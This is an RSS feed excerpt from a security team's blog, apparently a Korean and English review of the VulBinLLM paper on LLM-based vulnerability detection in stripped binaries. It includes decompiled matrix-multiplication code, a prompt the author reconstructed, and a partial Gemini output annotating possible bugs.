&#xC218;&#xC815;&#xD558;&#xBA74; &#xB418;&#xACA0;&#xC8E0;.</p><h3 id="2-&#xC7A5;&#xAE30;-&#xAE30;&#xC5B5;-Long-term-Memory"><a href="#2-&#xC7A5;&#xAE30;-&#xAE30;&#xC5B5;-Long-term-Memory" class="headerlink" title="2) &#xC7A5;&#xAE30; &#xAE30;&#xC5B5; (Long-term Memory)"></a>2) &#xC7A5;&#xAE30; &#xAE30;&#xC5B5; (Long-term Memory)</h3><p>LLM&#xC758; &#xACE0;&#xC9C8;&#xC801;&#xC778; &#xBB38;&#xC81C; &#xC911; &#xD558;&#xB098;&#xAC00; &#xC785;&#xB825; &#xAE38;&#xC774; &#xC81C;&#xD55C;(Context Window)&#xC785;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC804;&#xCCB4; &#xCF54;&#xB4DC;&#xB97C; &#xD55C; &#xBC88;&#xC5D0; &#xB123;&#xC5B4;&#xC904; &#xC218;&#xAC00; &#xC5C6;&#xC73C;&#xB2C8;, &#xCF54;&#xB4DC;&#xB97C; &#xC798;&#xAC8C; &#xCABC;&#xAC1C;&#xC11C; &#xBB3C;&#xC5B4;&#xBD10;&#xC57C; &#xD558;&#xC8E0;. &#xADFC;&#xB370; &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xB9E5;&#xB77D;&#xC744; &#xB193;&#xCE58;&#xAE30; &#xC27D;&#xC2B5;&#xB2C8;&#xB2E4;. A&#xB77C;&#xB294; &#xD568;&#xC218;&#xAC00; B&#xB77C;&#xB294; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;, &#xADF8; &#xACB0;&#xACFC;&#xAC00; C&#xB77C;&#xB294; &#xBCC0;&#xC218;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xB294; &#xBCF5;&#xC7A1;&#xD55C; &#xD750;&#xB984;&#xC744; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#xB294; &#xAC70;&#xC8E0;.</p><p>VulBinLLM&#xC740; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#x2018;&#xC7A5;&#xAE30; &#xAE30;&#xC5B5;&#x2019;&#xC774;&#xB77C;&#xB294; &#xAC1C;&#xB150;&#xC744; &#xB3C4;&#xC785;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xC758; &#xC911;&#xC694;&#xD55C; &#xBD80;&#xBD84;(&#xC608;: &#xD568;&#xC218; &#xC694;&#xC57D;, &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870; &#xB4F1;)&#xC744; &#xBBF8;&#xB9AC; &#xC694;&#xC57D;&#xD574;&#xC11C; &#xC800;&#xC7A5;&#xD574;&#xB450;&#xACE0;, LLM&#xC774; &#xB2E4;&#xB978; &#xCF54;&#xB4DC; &#xC870;&#xAC01;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xB54C; &#xC774; &#x2018;&#xAE30;&#xC5B5;&#x2019;&#xC744; &#xD568;&#xAED8; &#xCC38;&#xACE0;&#xD558;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. &#xB17C;&#xBB38;&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xC774; &#xC815;&#xBCF4;&#xC5D0;&#xB294; <strong>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xBAA9;&#xC801;&#xC5D0; &#xB300;&#xD55C; &#xC694;&#xC57D;, &#xD575;&#xC2EC; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;, &#xD568;&#xC218; &#xD638;&#xCD9C; &#xADF8;&#xB798;&#xD504;(Call Graph)</strong> &#xB4F1;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xB54C;, LLM&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xCD94;&#xAC00; &#xC815;&#xBCF4;&#xB97C; &#xD568;&#xAED8; &#xBC1B;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC694;&#xC57D;:</strong> &#x201C;&#xC774; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB85C;&#xBD80;&#xD130; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xC544; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD14C;&#xC2A4;&#xD2B8; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xB2E4;.&#x201D;</li><li><strong>&#xB370;&#xC774;&#xD130; &#xD750;&#xB984;:</strong> &#x201C;<code>getenv</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC678;&#xBD80; &#xC785;&#xB825;&#xC774; <code>user_input</code> &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xACE0;, &#xC774; &#xBCC0;&#xC218;&#xB294; <code>memcpy</code> &#xD568;&#xC218;&#xC758; &#xC18C;&#xC2A4;(source)&#xB85C; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.&#x201D;</li></ul><p>&#xC774;&#xB7EC;&#xD55C; &#xB9E5;&#xB77D; &#xC815;&#xBCF4;&#xAC00; &#xC788;&#xC73C;&#xBA74;, LLM&#xC740; <code>user_input</code>&#xC774; &#xADF8;&#xB0E5; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#x2018;&#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xC678;&#xBD80; &#xC785;&#xB825;&#x2019;&#xC774;&#xB77C;&#xB294; &#xC810;&#xC744; &#xBA85;&#xD655;&#xD788; &#xC778;&#xC9C0;&#xD558;&#xACE0;, &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB354; &#xC815;&#xD655;&#xD558;&#xAC8C; &#xD310;&#xB2E8;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h2><p>&#xC624;&#xB298;&#xC740; &#x201C;VulBinLLM: LLM-powered Vulnerability Detection for Stripped Binaries&#x201D; &#xB17C;&#xBB38; &#xB0B4;&#xC6A9;&#xC744; &#xACF5;&#xBD80;&#xD558;&#xBA74;&#xC11C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4; &#xB17C;&#xBB38;&#xC758; &#xC544;&#xC26C;&#xC6B4; &#xC810;&#xC774; &#xC880; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xCD5C;&#xC2E0; LLM &#xBAA8;&#xB378;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;: &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC5EC;&#xB7EC; &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB3C4; &#xAC19;&#xC774; &#xBCF4;&#xC774;&#xB294; &#xB2E8;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xBB34;&#xB798;&#xB3C4; &#xBAA8;&#xB378;&#xC758; &#xAC1C;&#xBC1C; &#xC18D;&#xB3C4;&#xAC00; &#xC6CC;&#xB099; &#xBE60;&#xB974;&#xB2E4;&#xBCF4;&#xB2C8; &#xC124;&#xACC4;&#xD558;&#xACE0; &#xAC1C;&#xBC1C;&#xD558;&#xACE0; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD55C; &#xB4A4;&#xC5D0; &#xB17C;&#xBB38;&#xC744; &#xC4F0;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC815;&#xB9D0; &#xC2E0;&#xBC15;&#xD55C; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xC77C;&#xAE4C;&#x2026;?: Stripped Binary &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xB17C;&#xBB38;&#xC740; &#xC774;&#xBBF8; &#xB098;&#xC640;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC774; &#xC774; &#xB17C;&#xBB38;&#xC758; &#xD575;&#xC2DC; &#xC5F0;&#xAD6C; &#xAC00;&#xCE58;&#xC77C;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xBD80;&#xBD84;&#xC740; &#xC880; &#xC758;&#xC544;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xCD5C;&#xADFC; LLM &#xAD00;&#xB828; &#xB17C;&#xBB38;&#xB4E4;&#xC774; &#xB108;&#xBB34; &#xB9CE;&#xC774; &#xB098;&#xC624;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC815;&#xB9D0; &#xC88B;&#xC740; &#xB17C;&#xBB38;&#xC744; &#xACE8;&#xB77C; &#xC77D;&#xAE30;&#xB294; &#xC27D;&#xC9C0; &#xC54A;&#xC544; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB9CC; &#xD6D1;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xAE34;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xB3C4; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xAC00; &#xC88B;&#xC740; &#xB17C;&#xBB38;&#xC774; &#xBCF4;&#xC774;&#xBA74; &#xB610; &#xACF5;&#xBD80;&#xD574;&#xC11C; &#xC62C;&#xB824;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><p>&#xADF8;&#xB7FC; &#xB610; &#xC5B8;&#xC820;&#xAC04;&#x2026; &#xB2E4;&#xC74C; &#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC62C;&#xAC8C;&#xC694;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM/">LLM</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Security/">LLM Security</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Safety/">LLM Safety</category>
      
      <category domain="https://hackyboiz.github.io/tags/VulBinLLM/">VulBinLLM</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] LLM Security &amp; Safety Part 2. VulBinLLM Review(KR)</title>
      <link>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/en/</link>
      <guid>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/en/</guid>
      <pubDate>Sun, 15 Jun 2025 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/06/15/j0ker/llm_part2/en/9xgtc2.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;p&gt;Hello! It&amp;#x2019;s been 6 months since I&amp;#x2019;ve been back</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/06/15/j0ker/llm_part2/en/9xgtc2.jpg" alt="index_img"></p><p>Hello! It&#x2019;s been 6 months since I&#x2019;ve been back to &#x2026;. I&#x2019;m j0ker! The reason for the lack of posts in the first half of 2025 is&#x2026; I was too busy&#x2026; lol Even while I was busy, I was slowly following up on LLM-related trends, but as more and more papers and technologies come out, it&#x2019;s hard to keep up&#x2026; For God&#x2019;s sake&#x2026; When do you get to work?</p><p>So, rather than summarise the overall trend, I&#x2019;ll just summarise what I&#x2019;ve been reading for the time being. Today&#x2019;s paper is &#x201C;VulBinLLM: LLM-powered Vulnerability Detection for Stripped Binaries&#x201D;. I started reading the paper with the thought that it&#x2019;s about finding stripped binary vulnerabilities with LLM&#x2026; is this really possible?</p><p><img src="/2025/06/15/j0ker/llm_part2/en/9xgth1.jpg" alt="image.jpg"></p><blockquote><p>Try your best, LLM&#x2026;</p></blockquote><h2 id="1-Can-LLM-be-used-to-find-vulnerabilities"><a href="#1-Can-LLM-be-used-to-find-vulnerabilities" class="headerlink" title="1. Can LLM be used to find vulnerabilities?"></a>1. Can LLM be used to find vulnerabilities?</h2><p>This is the topic that fandu presented at the Hackyboiz Open Seminar a few days ago. It&#x2019;s a very simple but powerful idea: &#x201C;Hey, can we LLM this because it&#x2019;s hard for humans to read?&#x201D; Team Atlanta found a zero-day vulnerability in SQLite at AIxCC last year, Project0 found a vulnerability&#x2026; and now X also found a zero-day vulnerability in Linux SMB using LLM.</p><ul><li><a href="https://sean.heelan.io/2025/05/22/how-i-used-o3-to-find-cve-2025-37899-a-remote-zeroday-vulnerability-in-the-linux-kernels-smb-implementation/">How I used o3 to find CVE-2025-37899, a remote zeroday vulnerability in the Linux kernel&#x2019;s SMB implementation</a></li></ul><p>This article caused quite a stir on X (formerly Twitter).</p><p><img src="/2025/06/15/j0ker/llm_part2/en/x_1.png" alt="image.png"></p><blockquote><p>Tons of likes and retweets&#x2026;. Give our team account a lot of love too&#x2026;! <a href="https://x.com/hackyboiz">@hackyboiz</a></p></blockquote><p>It seems too obvious that we can use LLMs to find zero-days.</p><h2 id="2-Stripped-Binary"><a href="#2-Stripped-Binary" class="headerlink" title="2. Stripped Binary"></a>2. Stripped Binary</h2><p>First of all, you should know what a &#x2018;Stripped Binary&#x2019; is, right? When we usually write C or C++ code and compile it, we get an executable (binary) file, right? When debugging, it&#x2019;s easy to analyse because it contains all the information (symbols) like function names and variable names.<br>But when it&#x2019;s deployed, it&#x2019;s stripped of all this information to reduce the size and make it harder for hackers like us to analyse. This is what Stripped Binary is: function names are changed to <code>sub_401000</code> or something like that, you don&#x2019;t even know what the variables are&#x2026; and analysing them is a real nightmare. When I was first doing CTF or bug hunting, I had a chance to analyse an open source vulnerability by looking at a stripped binary, and it was a new world&#x2026; No, it&#x2019;s so easy to analyse? (That&#x2019;s why I&#x2019;ve been looking for vulnerabilities in open source since then&#x2026;)</p><h2 id="3-So-how-are-you-going-to-find-vulnerabilities-with-LLM"><a href="#3-So-how-are-you-going-to-find-vulnerabilities-with-LLM" class="headerlink" title="3. So how are you going to find vulnerabilities with LLM?"></a>3. So how are you going to find vulnerabilities with LLM?</h2><p>The main goal of this thesis is to create VulBinLLM, a system that uses LLM to automatically find vulnerabilities in stripped binaries. But can we just paste the decompiled code and tell LLM &#x201C;hey, find vulnerabilities&#x201D; and it will work? Yes, for simple code. But on larger, more massive chunks of code? If it&#x2019;s stripped binary and doesn&#x2019;t even have proper function and variable names? It&#x2019;s a recipe for bullshit. The real contribution of this paper is how to solve that &#x201C;how?&#x201D;.</p><p>In the thesis, we designed the following systematic structure to solve this problem.</p><p><img src="/2025/06/15/j0ker/llm_part2/en/figure1.png" alt="image.png"></p><p>Instead of just putting binaries into LLM, we built a clear pipeline: <strong>Decompilation -&gt; Optimisation -&gt; Long-term memory generation -&gt; LLM analysis</strong>. In particular, the &#x2018;optimisation&#x2019; and &#x2018;long-term memory&#x2019; parts are the core of this research.</p><h3 id="1-Decompilation-Optimisation-Refining-code-for-LLM"><a href="#1-Decompilation-Optimisation-Refining-code-for-LLM" class="headerlink" title="1) Decompilation Optimisation: Refining code for LLM"></a>1) Decompilation Optimisation: Refining code for LLM</h3><p>The first key is &#x2018;decompilation optimisation&#x2019;. The example below illustrates this process very clearly.</p><p>Before Optimisation (Ghidra):</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1, <span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function"></span>{local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-keyword">for</span> (*(<span class="hljs-keyword">long</span> *)local_34 = <span class="hljs-number">0</span>; *(<span class="hljs-keyword">long</span> *)local_34 &lt; R1; local_34++) {<span class="hljs-keyword">for</span> (local_30 = <span class="hljs-number">0</span>; local_30 &lt; C2; local_30++) {(auStack_28)[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (local_2c = <span class="hljs-number">0</span>; local_2c &lt; R2; local_2c++) {auStack_28[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] += *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">0xc</span> + param_2 + (<span class="hljs-keyword">long</span>)local_30 * <span class="hljs-number">4</span>)* *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_34 * <span class="hljs-number">8</span> + param_1 + (<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">4</span>);}}}}</code></pre><p>As you can see, the variable names don&#x2019;t make sense, like <code>param_1</code>, <code>local_34</code>, and <code>R2</code>, and although there are several loop statements used, it&#x2019;s not immediately obvious what&#x2019;s going on.</p><p>After optimisation (VulBinLLM):</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> input_matrix_1, <span class="hljs-keyword">long</span> input_matrix_2)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">// Initialize a matrix to store the result of matrix multiplication</span><span class="hljs-keyword">int</span> result_matrix[row_1][column_2] = {<span class="hljs-number">0</span>};<span class="hljs-comment">// Iterate over each row and column of the result matrix</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; row_1; current_row++) {<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; column_2; current_col++) {<span class="hljs-comment">// Perform matrix multiplication by iterating over the shared dimension</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; row_2; shared_dim++) {<span class="hljs-comment">// Vulnerability: Potential pointer arithmetic issue if column_1 and row_2 are not properly allocated</span><span class="hljs-comment">// Multiply corresponding elements from the input matrices and accumulate the result</span>result_matrix[current_row][current_col] += *((<span class="hljs-keyword">int</span> *)(input_matrix_2 + shared_dim * <span class="hljs-number">12</span> + current_col * <span class="hljs-number">4</span>)) * *((<span class="hljs-keyword">int</span> *)(input_matrix_1 + current_row * <span class="hljs-number">8</span> + shared_dim * <span class="hljs-number">4</span>));}}}}</code></pre><p>After the optimisation, the code looks completely different: local_10 becomes result_matrix and comments are added, making it easier to see the full context of the function. They also provide information about potential vulnerabilities.</p><p>Unfortunately, the paper doesn&#x2019;t provide how the prompts were created in this process, but if we reverse this back to LLM and ask him to create the prompts, it looks like this</p><blockquote><p>You are a <strong>world-class cybersecurity expert specializing in reverse engineering</strong>. Your primary task is to analyze raw C code decompiled by Ghidra from a <strong>stripped binary</strong>. You need to refactor this code to maximize readability and, most importantly, <strong>identify and annotate potential security vulnerabilities</strong> for a security audit.</p><p>The input code will lack original symbols, have generic variable names (e.g., <code>param_1</code>, <code>local_10</code>), and use complex pointer arithmetic. Your job is to semantically reconstruct the original developer&#x2019;s intent and analyze it from a security perspective.</p><p><strong>Follow these steps precisely:</strong></p><ol><li><p><strong>Semantic Analysis &amp; Renaming:</strong></p><ul><li>Infer the high-level purpose of the function (e.g., string copy, matrix multiplication, network packet processing).</li><li>Rename the function and its parameters (<code>param_1</code>, <code>param_2</code>, etc.) to reflect their inferred purpose (e.g., <code>multiplyMatrix</code>, <code>input_matrix_1</code>, <code>input_matrix_2</code>).</li><li>Rename local variables (<code>local_...</code>, <code>auStack_...</code>) to descriptive names based on their usage (e.g., <code>result_matrix</code>, <code>current_row</code>, <code>current_col</code>).</li></ul></li><li><p><strong>Code Refactoring for Readability:</strong></p><ul><li>Convert complex pointer arithmetic into more intuitive array or struct notation. For example, transform <code>*(int *)((long)local_2c * 0xc + param_2 + (long)local_30 * 4)</code> into a clearer form like <code>input_matrix_2[shared_dim][current_col]</code>.</li><li>Reconstruct data structures. If memory access patterns suggest a multi-dimensional array, represent it as such.</li><li>Simplify control flow and logic where possible without changing the functionality.</li></ul></li><li><p><strong>Vulnerability Identification &amp; Annotation:</strong></p><ul><li>Scrutinize the code for common C/C++ vulnerabilities, including but not limited to:<ul><li><strong>Buffer Overflows/Underflows:</strong> Unchecked indexing or pointer arithmetic.</li><li><strong>Integer Overflows/Underflows:</strong> Operations that could lead to wrapping.</li><li><strong>Null Pointer Dereferences:</strong> Use of pointers that could be null.</li><li><strong>Use-After-Free:</strong> Accessing memory after it has been freed.</li><li><strong>Information Leakage:</strong> Exposing sensitive data.</li></ul></li><li>For <strong>each potential vulnerability found</strong>, insert a comment in the line immediately preceding the vulnerable code. The comment must start with <code>// Vulnerability:</code> and provide a concise explanation of the potential risk.</li></ul></li><li><p><strong>Add Explanatory Comments:</strong></p><ul><li>Add a high-level comment at the beginning of the function explaining its overall purpose.</li><li>Add comments to explain complex or non-obvious parts of the algorithm.</li></ul></li></ol><p><strong>Here is an example of the desired transformation:</strong></p><p><strong>[INPUT] Raw Decompiled Code from Ghidra:</strong><br><pre><code class="hljs C">&gt;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1, <span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function">&gt;</span>{local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-keyword">for</span> (*(<span class="hljs-keyword">long</span> *)local_34 = <span class="hljs-number">0</span>; *(<span class="hljs-keyword">long</span> *)local_34 &lt; R1; local_34++) {<span class="hljs-keyword">for</span> (local_30 = <span class="hljs-number">0</span>; local_30 &lt; C2; local_30++) {(auStack_28)[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (local_2c = <span class="hljs-number">0</span>; local_2c &lt; R2; local_2c++) {auStack_28[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] += *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">0xc</span> + param_2 + (<span class="hljs-keyword">long</span>)local_30 * <span class="hljs-number">4</span>)* *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_34 * <span class="hljs-number">8</span> + param_1 + (<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">4</span>);}}}&gt;}</code></pre></p><p><strong>[OUTPUT] Optimized Code for Vulnerability Analysis:</strong><br><pre><code class="hljs C">&gt;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> input_matrix_1, <span class="hljs-keyword">long</span> input_matrix_2)</span></span><span class="hljs-function">&gt;</span>{<span class="hljs-comment">// Initialize a matrix to store the result of matrix multiplication</span><span class="hljs-keyword">int</span> result_matrix[row_1][column_2] = {<span class="hljs-number">0</span>};<span class="hljs-comment">// Iterate over each row and column of the result matrix</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; row_1; current_row++) {<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; column_2; current_col++) {<span class="hljs-comment">// Perform matrix multiplication by iterating over the shared dimension</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; row_2; shared_dim++) {<span class="hljs-comment">// Vulnerability: Potential out-of-bounds access if matrix dimensions (R1, C2, R2) are not validated</span><span class="hljs-comment">// before this function call. The pointer arithmetic relies on these external constants.</span><span class="hljs-comment">// Multiply corresponding elements from the input matrices and accumulate the result.</span>result_matrix[current_row][current_col] += *((<span class="hljs-keyword">int</span> *)(input_matrix_2 + shared_dim * <span class="hljs-number">12</span> + current_col * <span class="hljs-number">4</span>)) * *((<span class="hljs-keyword">int</span> *)(input_matrix_1 + current_row * <span class="hljs-number">8</span> + shared_dim * <span class="hljs-number">4</span>));}}}&gt;}</code></pre></p><hr><p>Now, apply this process to the following Ghidra decompiled code. Provide ONLY the optimized C code as your output.</p><p><strong>[YOUR CODE TO ANALYZE GOES HERE]</strong></p></blockquote><p>This creates a prompt, complete with an example. We need to test the prompt to make sure it works, so let&#x2019;s remove the example and put it into Gemini.</p><p>Result:</p><pre><code class="hljs c"><span class="hljs-comment">/**</span><span class="hljs-comment"> * @brief Performs matrix multiplication of matrix_A (R1 x R2) and matrix_B (R2 x C2).</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * This function reconstructs the logic for matrix multiplication. It takes pointers to two</span><span class="hljs-comment"> * matrices, `matrix_A_ptr` and `matrix_B_ptr`, and computes their product. The resulting</span><span class="hljs-comment"> * (R1 x C2) matrix is stored in a local stack variable `result_matrix`.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * The dimensions R1 (rows of A), R2 (cols of A / rows of B), and C2 (cols of B)</span><span class="hljs-comment"> * are assumed to be externally defined constants (e.g., preprocessor macros),</span><span class="hljs-comment"> * which is a common source of vulnerabilities.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Based on the memory access patterns from the decompilation:</span><span class="hljs-comment"> * - matrix_A is treated as an [R1][R2] integer matrix.</span><span class="hljs-comment"> * - matrix_B is treated as an [R2][C2] integer matrix.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Note: The original stack canary check (`in_FS_OFFSET`) has been removed for clarity</span><span class="hljs-comment"> * as it is a compiler-generated security mechanism and not part of the original logic.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * @param matrix_A_ptr  Pointer to the first input matrix (assumed to be flattened R1xR2).</span><span class="hljs-comment"> * @param matrix_B_ptr  Pointer to the second input matrix (assumed to be flattened R2xC2).</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiply_matrices</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *matrix_A_ptr, <span class="hljs-keyword">int</span> *matrix_B_ptr)</span> </span>{    <span class="hljs-comment">// Vulnerability: Null Pointer Dereference</span>    <span class="hljs-comment">// The function does not check if input pointers are NULL before use. If either</span>    <span class="hljs-comment">// `matrix_A_ptr` or `matrix_B_ptr` is NULL, dereferencing them inside the loops</span>    <span class="hljs-comment">// will cause a segmentation fault and crash the application.</span>    <span class="hljs-comment">// To improve readability, we cast the flat input pointers to 2D array pointers.</span>    <span class="hljs-comment">// This mirrors the structured access intended by the original developer.</span>    <span class="hljs-comment">// The pointer arithmetic `(row * stride) + col_offset` is now `[row][col]`.</span>    <span class="hljs-comment">// The strides inferred from Ghidra (`* 8` for A, `* 0xc` for B) suggest R2=2 and C2=3.</span>    <span class="hljs-keyword">int</span> (*matrix_A)[R2] = (<span class="hljs-keyword">int</span> (*)[R2])matrix_A_ptr;    <span class="hljs-keyword">int</span> (*matrix_B)[C2] = (<span class="hljs-keyword">int</span> (*)[C2])matrix_B_ptr;    <span class="hljs-comment">// Vulnerability: Stack Buffer Overflow</span>    <span class="hljs-comment">// The result matrix is allocated on the stack with a size fixed at compile time</span>    <span class="hljs-comment">// via the macros R1 and C2. If the actual dimensions of the input matrices</span>    <span class="hljs-comment">// (determined by the caller) are larger than these compiled constants, the loops</span>    <span class="hljs-comment">// will write past the bounds of `result_matrix`, corrupting the stack.</span>    <span class="hljs-keyword">int</span> result_matrix[R1][C2];    <span class="hljs-comment">// Iterate over each row of the first matrix (matrix_A).</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; R1; current_row++) {        <span class="hljs-comment">// Iterate over each column of the second matrix (matrix_B).</span>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; C2; current_col++) {                        <span class="hljs-comment">// Initialize the target cell in the result matrix.</span>            result_matrix[current_row][current_col] = <span class="hljs-number">0</span>;            <span class="hljs-comment">// Calculate the dot product for the cell (current_row, current_col).</span>            <span class="hljs-comment">// This loop iterates over the shared dimension (columns of A and rows of B).</span>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; R2; shared_dim++) {                                <span class="hljs-comment">// Vulnerability: Integer 